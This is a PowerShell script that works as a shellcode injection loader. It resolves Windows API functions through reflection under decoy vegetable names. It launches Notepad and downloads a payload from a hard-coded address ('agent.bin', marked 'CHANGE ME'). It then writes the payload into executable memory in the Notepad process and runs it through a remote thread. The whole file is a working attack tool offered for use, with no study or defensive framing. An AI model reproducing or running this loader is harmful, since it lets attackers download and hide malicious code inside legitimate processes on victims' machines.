function potatoes {
    Param ($cherries, $pineapple)
    $tomatoes = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $turnips=@()
    $tomatoes.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$turnips+=$_}}
    return $turnips[0].Invoke($null, @(($tomatoes.GetMethod('GetModuleHandle')).Invoke($null, @($cherries)), $pineapple))
}

function apples {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# Start Notepad and validate process
$process = Start-Process notepad.exe -PassThru
if (-not $process) {
    Write-Error "Failed to start Notepad"
    return
}
Write-Output "Success: Notepad process started with PID $($process.Id)"

# Check if process is still running
$exitCodeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll GetExitCodeProcess), (apples @([IntPtr], [Int32].MakeByRefType()) ([Bool])))
$exitCode = 0
if (-not $exitCodeDelegate.Invoke($process.Handle, [ref]$exitCode) -or $exitCode -ne 259) {  # 259 = STILL_ACTIVE
    Write-Error "Notepad process is not running or in an invalid state"
    return
}
Write-Output "Success: Notepad process is running and stable"

# Open process
$procHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll OpenProcess), (apples @([UInt32], [Bool], [UInt32]) ([IntPtr]))).Invoke(0x1F0FFF, $false, $process.Id)
if ($procHandle -eq [IntPtr]::Zero) {
    Write-Error "Failed to open Notepad process"
    return
}
Write-Output "Success: Opened Notepad process handle"

# Download shellcode
$client = New-Object System.Net.WebClient
try {
    $shellcode = $client.DownloadData("http://10.100.102.67/agent.bin") # <<<<<<<<<CHANGE ME>>>>>>>>>>>>
    if ($shellcode.Length -eq 0) {
        Write-Error "Shellcode download failed or is empty"
        return
    }
    Write-Output "Success: Shellcode downloaded, size: $($shellcode.Length) bytes"
} catch {
    Write-Error "Failed to download shellcode: $_"
    return
} finally {
    $client.Dispose()
    Write-Output "Success: WebClient resources cleaned up"
}

# Allocate memory
$allocDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll VirtualAllocEx), (apples @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$cucumbers = $allocDelegate.Invoke($procHandle, [IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
if ($cucumbers -eq [IntPtr]::Zero) {
    Write-Error "Memory allocation failed"
    $closeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll CloseHandle), (apples @([IntPtr]) ([Bool])))
    $closeDelegate.Invoke($procHandle) | Out-Null
    return
}
Write-Output "Success: Allocated memory in Notepad process at address $cucumbers"

# Write shellcode to memory
$writeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll WriteProcessMemory), (apples @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$bytesWritten = [IntPtr]::Zero
if (-not $writeDelegate.Invoke($procHandle, $cucumbers, $shellcode, $shellcode.Length, $bytesWritten)) {
    Write-Error "Failed to write shellcode to process memory"
    $closeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll CloseHandle), (apples @([IntPtr]) ([Bool])))
    $closeDelegate.Invoke($procHandle) | Out-Null
    return
}
Write-Output "Success: Wrote shellcode to Notepad process memory"

# Create remote thread
$threadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll CreateRemoteThread), (apples @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])))
$parsnips = $threadDelegate.Invoke($procHandle, [IntPtr]::Zero, 0, $cucumbers, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($parsnips -eq [IntPtr]::Zero) {
    Write-Error "Failed to create remote thread"
    $closeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll CloseHandle), (apples @([IntPtr]) ([Bool])))
    $closeDelegate.Invoke($procHandle) | Out-Null
    return
}
Write-Output "Success: Created remote thread in Notepad process"

# Wait for thread with timeout
$waitDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll WaitForSingleObject), (apples @([IntPtr], [Int32]) ([Int])))
$timeout = 5000  # 5 seconds timeout
$startTime = [DateTime]::Now
do {
    $result = $waitDelegate.Invoke($parsnips, 100)  # Wait for 100ms
    if ($result -eq 0) { break }  # Thread completed
    $elapsed = ([DateTime]::Now - $startTime).TotalMilliseconds
    Start-Sleep -Milliseconds 10
} while ($elapsed -lt $timeout)
Write-Output "Success: Waited for thread execution, completed within timeout"

# Check thread exit code
$threadExitCodeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll GetExitCodeThread), (apples @([IntPtr], [Int32].MakeByRefType()) ([Bool])))
$threadExitCode = 0
if ($threadExitCodeDelegate.Invoke($parsnips, [ref]$threadExitCode)) {
    if ($threadExitCode -eq 0) {
        Write-Output "Success: Thread executed with exit code 0"
    } else {
        Write-Warning "Thread exited with code: $threadExitCode"
    }
} else {
    Write-Warning "Failed to get thread exit code"
}

# Clean up
$closeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll CloseHandle), (apples @([IntPtr]) ([Bool])))
$closeDelegate.Invoke($parsnips) | Out-Null
$closeDelegate.Invoke($procHandle) | Out-Null
Write-Output "Success: Cleaned up thread and process handles"
